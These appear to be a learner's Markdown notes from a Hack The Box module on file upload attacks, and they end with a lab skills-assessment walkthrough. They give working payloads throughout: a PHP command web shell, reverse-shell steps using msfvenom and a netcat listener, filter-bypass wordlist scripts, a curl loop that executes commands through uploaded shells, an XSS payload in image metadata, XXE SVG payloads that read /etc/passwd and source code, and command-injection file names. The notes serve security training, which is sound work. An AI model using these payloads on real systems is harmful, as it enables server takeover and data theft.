# File Upload Attacks

1. [Basic Exploitation](#basic-exploitation)
1. [Bypassing Filters](#bypassing-filters)
1. [Other Upload Attacks](#other-upload-attacks)
1. [Skills Assessment](#skills-assessment)

## Basic Exploitation

* Absent validation:

  * no validation filters, so we can go for arbitrary file upload, like web shell or reverse shell

  * web shell has to be written in the same language as the web server; we can identify this using Wappalyzer or manually checking the source code if needed

  * once web framework is identified (for example - PHP), we can test by uploading arbitrary files; the result can be viewed (if file is uploaded successfully) at the location of file upload in browser:

    ```php
    <?php echo "Hello HTB";?> 
    // prints the message
    ```

    ```php
    <?php system("hostname");?>
    // executes the command 'hostname' on the backend
    ```
  
  * for PHP web shells, we can check [phpbash](https://github.com/Arrexel/phpbash) or the webshells provided in [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)

  * we can also create a basic one-liner PHP webshell:

    ```php
    <?php system($_REQUEST['cmd']); ?>
    // we can use the cmd GET parameter to execute our commands
    ```
  
  * for reverse shells, we can use the [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), or use [Seclists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) like before, or use online tools such as [Revshell](https://www.revshells.com/):

    ```shell
    vim rev-shell.php
    # edit the IP and Port fields to our input machine's IP and Port

    nc -lvnp 4444
    # start netcat listener, assuming we have given 4444 as the listener port in the reverse shell
    # then we can upload the reverse shell and visit its link to trigger the script and get reverse connection
    ```

    ```shell
    # creating custom reverse shell scripts using msfvenom

    msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
    ```

## Bypassing Filters

* Client-side validation:

  * in case of client-side validation, we cannot upload web shells or PHP scripts directly as it would accept only certain file types

  * to bypass client-side validation, either modify upload request to backend server, or manipulate frontend to disable validation

  * backend request modification - when uploading the actual image, intercept the request and modify the fields ```filename=photo.jpg``` and the file content at end of request; this should be modified to ```filename=shell.php``` and content should be web shell code - for example, ```<?php system($_REQUEST['cmd']); ?>```

  * disabling frontend validation - read and change source code to bypass restrictions

* Blacklisting extensions:

  * not recommended as blacklist cannot be comprehensive (can't include everything); and in Windows systems, we can bypass using mixed-case extensions

  * we can also fuzz extensions to check which ones are blacklisted; for PHP, we can use [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst), and for common extensions, we can check [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

  * for fuzzing we can use Burp Suite's Intruder using the file extension in our request as payload position (uncheck URL-encoding if '.' is there in extension)

  * once we have the non-blacklisted extensions, we can try to bypass the filter; not all extensions will work with all web servers, but the key methodology is same (change extension, replace original content with web shell content)

* Whitelisting extensions:

  * similar to the previous one, we can start by fuzzing extensions and check if any of them bypasses the whitelisting logic implemented

  * double extensions - if ```.jpg``` extension is allowed, upload a file and intercept the request; modify file name to ```shell.jpg.php``` and modify its content to include web shell code

  * reverse double extensions (works in case of web server misconfig) - similar to above method, except for file named as ```shell.php.jpg```; if web server blacklists PHP extensions, for example, then we would have to check which extensions are blacklisted first, before implementing this method

  * character injection - chars can be injected before/after final extension to attempt uploading file as PHP script; each character has a specific use case and works according to web server config. Some characters include:

    * ```%20```
    * ```%0a```
    * ```%00```
    * ```%0d0a```
    * ```/```
    * ```.\```
    * ```.```
    * ```...```
    * ```:```

  * simple bash script to generate all permutations of filename; the wordlist generated can be later used in Burp Intruder for fuzzing:

    ```shell
    for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.pht' '.phar' '.phtml'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
    done
    ```

* ```Content-Type``` filters:

  * if fuzzing the file extension does not affect the error message (e.g. - only images are allowed), then webapp might be testing file content for type validation - either in ```Content-Type``` header or ```File Content```

  * browsers set the ```Content-Type``` header automatically when selecting a file to upload; this is a client-side operation so we can bypass this using wordlists such as [Content-Type wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt):

    ```shell
    # filter only for relevant, image header values

    cat /usr/share/seclists/Miscellaneous/web/content-type.txt | grep 'image/' > image-content-types.txt
    ```
  
  * we can fuzz the ```Content-Type``` header value to check which types are allowed

  * then we can intercept the request, change the ```Content-Type``` header value (for the uploaded file) to one of the accepted types, but keep the filename and the file content with respect to the webshell

  * if we have only one ```Content-Type``` header in the request (not for the file), then we would need to modify that value

* ```MIME-Type``` filters:

  * these filters inspect the first few bytes of the file content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) (or magic bytes)

  * for example, if we change the first bytes of any file to ```GIF87a``` or ```GIF89a```, its MIME type would be changed to a GIF; the ```file``` command finds the file type through MIME type (and can also be used by web servers)

  * to bypass this filter, we can intercept the request (change the ```Content-Type``` to bypass that filter), and add ```GIF8``` before our PHP code (in newline) to imitate a GIF image, but we are still keeping our filename extension to '.php' (or any allowed extension)

* For a system which implements all of the above filters:

  * intercept a genuine request, and fuzz using Burp Intruder to check for non-blacklisted extensions (PHP extensions in this case)

  * the non-blacklisted extensions are the ones which do not include "Extension not allowed" in the response

  * then, fuzz similarly but for ```Content-Type``` - for this scenario, we may have to check for values related to images

  * the responses which do not include "Only images are allowed" indicate allowed ```Content-Type``` values

  * if GIF is one of the accepted formats, for example, then to bypass filters such as ```MIME-Type```, we can include the magic bytes for GIF - ```GIF87a``` - before including the webshell content

  * to bypass whitelisting of extensions, we can use the Bash script from earlier, add in the non-blacklisted PHP extensions, and run the script to get a list of malicious double extensions (and reverse double extensions)

  * then, we can use this wordlist to fuzz a genuine request to see in which case the file gets uploaded successfully; while fuzzing for whitelisted extensions, we have to implement all the previous tricks, that is, including the magic bytes for GIF, tweaking ```Content-Type``` and adding the actual webshell content

  * after fuzzing, to check which payload works, we can write another script that checks each entry (payload) from the wordlist and sends a request

  * updated script for generating double extension wordlist (we can add other types like '.png' and '.gif' but that will increase wordlist size):

    ```shell
    for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '\x00'; do
        for ext in '.phtm' '.pht' '.phar' '.phtml' '.pgif'; do
            echo "shell$char$ext.jpg" >> double-ext-wordlist.txt
            echo "shell$ext$char.jpg" >> double-ext-wordlist.txt
            echo "shell.jpg$char$ext" >> double-ext-wordlist.txt
            echo "shell.jpg$ext$char" >> double-ext-wordlist.txt
        done
    done
    ```

  * script for sending request based on each entry in wordlist (should be run after fuzzing is done):

    ```shell
    # this is obviously a very primitive example but it does the job
    while IFS= read -r payload; do
      echo "Testing payload: $payload"
      curl "http://94.237.49.138:41642/profile_images/$payload?cmd=id"
    done < double-ext-wordlist.txt
    ```

## Other Upload Attacks

* Limited file uploads (can be used incase arbitrary file upload is not an option):

  * XSS:

    * can be used to exploit vulnerabilities like ```Stored XSS```; for example, if a web app allows uploading HTML files, we can implement JS code for XSS or CSRF attacks on whoever visits the uploaded HTML page

    * another example is for web apps that display image metadata after upload; we can include XSS payload in metadata parameters that accept raw text (if needed, we can change MIME-Type of image to ```text/html```):

      ```shell
      exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
      # inserts payload in Comment parameter of image metadata
      ```

    * XSS attacks can also be carried with SVG images (which are XML-based), and we can include XSS payload within XML data
  
  * XXE:

    * for SVG images, we can include malicious XML data to leak file content on server or to read source code:

      ```xml
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <svg>&xxe;</svg>
      ```

      ```xml
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
      <svg>&xxe;</svg>
      ```
  
  * DoS:

    * file upload vulnerabilities can also lead to a Denial of Service attack on the server

    * we can also use a Decompression Bomb with file types that use data compression

    * Pixel Flood attacks can be done with some image files that use image compression

* Other upload attack techniques:

  * Injections in file name:

    * we can inject malicious strings in the uploaded file name itself, which may get executed if file name is displayed on page
    * for example, we can try naming a file ```file$(whoami).jpg``` or ```file.jpg||whoami```
    * similarly, we can use XSS or SQLi payloads in file name; it depends on how the query is structured though
  
  * Upload directory disclosure:

    * we can use fuzzing to find uploads directory, or use other vulnerabilities like LFI or XXE to read web app source code
    * we can also try forcing error messages (e.g. - by sending two identical requests simultaneously, or having a long file name), which can reveal more info
  
  * Windows-specific attacks:

    * using reserved characters such as ```|```, ```<```, ```>```, ```*``` or ```?```
    * using reserved keywords for file names like ```CON```, ```COM1```, ```LPT1``` or ```NUL```
    * using [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or referring files that don't exist
    * for example, to refer ```hackthebox.txt``` we can use ```HAC~1.txt``` or ```HAC~2.txt``` (digit represents order of matching files); similarly, we can write a file called ```WEB~.conf``` to overwrite ```web.conf```

## Skills Assessment

* The target website has a 'Contact' section which includes an image upload feature, along with other required fields

* From the page source code, we can see that it whitelists three extensions - ```.jpg```, ```.jpeg``` and ```.png```

* Intercepting and fuzzing a genuine request does not help in this case because we get a generic message, but we are not sure if the upload got accepted or not

* In the upload page, in addition to 'Submit', we have a preview feature as well - this request can also be intercepted

* We can start by intercepting a genuine preview request, followed by fuzzing for non-blacklisted extensions. From multiple PHP extensions, the ones which do not show the response "Extension not allowed" are ```.phar```, ```.pgif```, ```.phtm``` and ```.pht```

* Next, we can fuzz for allowed ```Content-Type``` values - this gives us ```image/png```, ```image/svg+xml``` and ```image/jpeg``` as the only allowed ones

* Now, we would need to bypass two factors while adding the PHP web shell code - ```MIME-Type``` and file extensions

* For bypassing file extensions, we can use the double-extension wordlist script referred earlier (update the non-blacklisted extensions), and experiment with file signatures (magic bytes) for PNG and JPG

* Only certain file signatures work - one way to experiment before fuzzing is to send a genuine request to Burp Suite Repeater and modify the magic bytes (followed by other elements like file extension and ```Content-Type``` value); if we do not get the 'Only images are allowed' error, that means we are on the right track.

* After completing this step, we have a lot of file names that can be used with the PHP web shell content which successfully bypasses the filters. However, we do not know the upload directory.

* In order to find out the upload directory, we will need to read the source code of the PHP webpages - we can do so using an XXE attack.

* We can test using the previous approach - intercept a genuine request, send to Repeater, and make changes to the request. In this case, test first by reading ```/etc/passwd``` using an SVG upload.

* Once we are sure the XXE attack works, we can modify our XML payload to read other pages such as ```submit.php``` and ```upload.php```

* By reading ```upload.php``` source code, we find out the name of the target (upload) directory; the source code also shows that the file is renamed before storing by prefixing output of a PHP function, so we will have to keep that in mind

* Then, we can use an edited version of the script used previously to automate sending GET requests using ```cURL``` (ensure to edit in the required upload directory name and renamed file format) - and it should show us the web shell filename with command execution
